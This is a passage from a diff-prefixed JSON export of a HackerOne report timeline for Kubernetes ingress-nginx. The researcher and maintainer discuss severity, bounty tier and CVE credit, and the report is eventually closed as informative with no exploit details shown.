+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14692252,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @thisbug - Unfortunately, I do not have any updates for you at this time, but you will be updated as soon as there is additional information to share. Thanks for your patience!",
+            "automated_response": false,
+            "created_at": "2021-12-15T17:03:11.443Z",
+            "updated_at": "2021-12-15T17:03:11.443Z",
+            "actor": {
+                "username": "h1_analyst_leon",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_leon",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14692824,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks for your patience. We're still working with the maintainers of ingress-nginx to coordinate a fix and a release.",
+            "automated_response": false,
+            "created_at": "2021-12-15T17:26:07.081Z",
+            "updated_at": "2021-12-15T17:26:07.081Z",
+            "actor": {
+                "username": "cjcullen",
+                "cleared": false,
+                "verified": false,
+                "url": "/cjcullen",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14694121,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks for update",
+            "automated_response": false,
+            "created_at": "2021-12-15T20:04:31.751Z",
+            "updated_at": "2021-12-15T20:04:31.751Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14786785,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-12-23T00:36:18.689Z",
+            "updated_at": "2021-12-23T00:36:18.689Z",
+            "additional_data": {
+                "old_severity": "Medium (4.8)",
+                "new_severity": "Medium (6.5)",
+                "old_severity_id": 1300247,
+                "new_severity_id": 1342368
+            },
+            "actor": {
+                "username": "cjcullen",
+                "cleared": false,
+                "verified": false,
+                "url": "/cjcullen",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14786789,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-12-23T00:37:43.681Z",
+            "updated_at": "2021-12-23T00:37:43.681Z",
+            "actor": {
+                "url": "/kubernetes",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Kubernetes"
+                }
+            },
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "kubernetes",
+            "collaborator": {
+                "username": "thisbug",
+                "url": "/thisbug"
+            }
+        },
+        {
+            "id": 14786800,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@thisbug How would you like to be credited (if at all) in the CVE?",
+            "automated_response": false,
+            "created_at": "2021-12-23T00:42:46.467Z",
+            "updated_at": "2021-12-23T00:42:46.467Z",
+            "actor": {
+                "username": "cjcullen",
+                "cleared": false,
+                "verified": false,
+                "url": "/cjcullen",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14791410,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @cjcullen,\n\nThanks for reward. It's nice Christmas gift :)\n\nAbout CVE, yes, I would like to be credited. You can put my real name: Marcin Niemiec, with my email: niemiec.marcin@gmail.com\nI have also prepared draft of blog post about this vulnerability, maybe can be linked somehow in cve?\n\nTwo questions about bounty:\n1. Is source code of ingress-nginx in scope of Tier 1 or Tier 2 ? I was thinking based on description that it's Tier 1 ? \n2. I would propose to reconsider severity to high. Take a look on my similar finding in APISIX: CVE-2021-43557. In my opinion there is high severity as many developers trusting those headers need to check and fix their code. I have found already some 3rd party solutions relaying on those headers.\n\nBest,\nthisbug",
+            "automated_response": false,
+            "created_at": "2021-12-23T11:03:37.941Z",
+            "updated_at": "2021-12-23T11:03:37.941Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14892633,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::HackerRequestedMediation",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-01-04T06:51:58.659Z",
+            "updated_at": "2022-01-04T06:51:58.659Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14933158,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Ingress-nginx is a non-core component, which falls under tier 2: https://hackerone.com/kubernetes.\n\nAs for severity, I scored this as \"Low\" for both Confidentiality and Integrity since \"Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is constrained.\" My understanding is that this vulnerability affects services configured in a specific way, and not all services. Happy to hear more, though.",
+            "automated_response": false,
+            "created_at": "2022-01-06T19:06:33.225Z",
+            "updated_at": "2022-01-06T19:06:33.225Z",
+            "actor": {
+                "username": "cjcullen",
+                "cleared": false,
+                "verified": false,
+                "url": "/cjcullen",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14956106,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@cjcullen \n\nThanks for clarification about tiers. \n\nAs gut feeling I would also think about it as medium. But looking on CVSS 3.0, I would set Scope to Changed in your calculation. This external authentication service can belong to different authority, not the same as ingress-nginx. \n\nBest,\nthisbug",
+            "automated_response": false,
+            "created_at": "2022-01-08T21:46:29.727Z",
+            "updated_at": "2022-01-08T21:46:29.727Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 15113721,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@cjcullen \n\nHi any news, regarding this ticket ? In terms of CVSS and CVE ?\n\nBest,\nthisbug",
+            "automated_response": false,
+            "created_at": "2022-01-20T09:21:10.808Z",
+            "updated_at": "2022-01-20T09:21:10.808Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 15282991,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@cjcullen \nHi any news, regarding this ticket ? In terms of CVSS and CVE ?\nBest,\nthisbug",
+            "automated_response": false,
+            "created_at": "2022-02-01T14:06:42.905Z",
+            "updated_at": "2022-02-01T14:06:42.905Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 15501419,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@cjcullen\nHi any news, regarding this ticket ? In terms of CVSS and CVE ?\nBest,\nthisbug",
+            "automated_response": false,
+            "created_at": "2022-02-16T17:39:26.556Z",
+            "updated_at": "2022-02-16T17:39:26.556Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 15855737,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@cjcullen\nHi any news, regarding this ticket ? In terms of CVSS and CVE ?\nBest,\nthisbug",
+            "automated_response": false,
+            "created_at": "2022-03-13T09:34:51.704Z",
+            "updated_at": "2022-03-13T09:34:51.704Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 16404884,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi,\n\nThe ingress-nginx maintainers have convinced me that this is not an actual security vulnerability, so there will be no CVE. They have asked that you open a public issue [here](https://github.com/kubernetes/ingress-nginx/issues/new?assignees=&labels=kind%2Fbug&template=bug_report.md&title=) so that the community can decide how to handle this particular setup.\n\nI'm sorry this experience has been so bad. There has been quite a bit of high-latency back and forth behind the scenes, and we didn't keep you properly updated on the progress. I hope you continue digging into Kubernetes and Kubernetes subprojects and reporting your findings here. We truly appreciate the diligence in this report, and your patience in how long it took to be resolved.\n\nThanks,\n-CJ",
+            "automated_response": false,
+            "created_at": "2022-04-22T16:46:57.570Z",
+            "updated_at": "2022-04-22T16:46:57.570Z",
+            "actor": {
+                "username": "cjcullen",
+                "cleared": false,
+                "verified": false,
+                "url": "/cjcullen",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 16404992,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "Closing as informative.",
+            "automated_response": false,
+            "created_at": "2022-04-22T16:59:02.565Z",
+            "updated_at": "2022-04-22T16:59:02.565Z",
+            "actor": {
+                "username": "cjcullen",
+                "cleared": false,
+                "verified": false,
+                "url": "/cjcullen",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 16404994,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-04-22T16:59:11.949Z",
+            "updated_at": "2022-04-22T16:59:11.949Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "cjcullen",
+                "cleared": false,
+                "verified": false,
+                "url": "/cjcullen",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 16408818,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-04-23T07:07:08.794Z",
+            "updated_at": "2022-04-23T07:07:08.794Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 16408819,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-04-23T07:07:08.988Z",
+            "updated_at": "2022-04-23T07:07:08.988Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
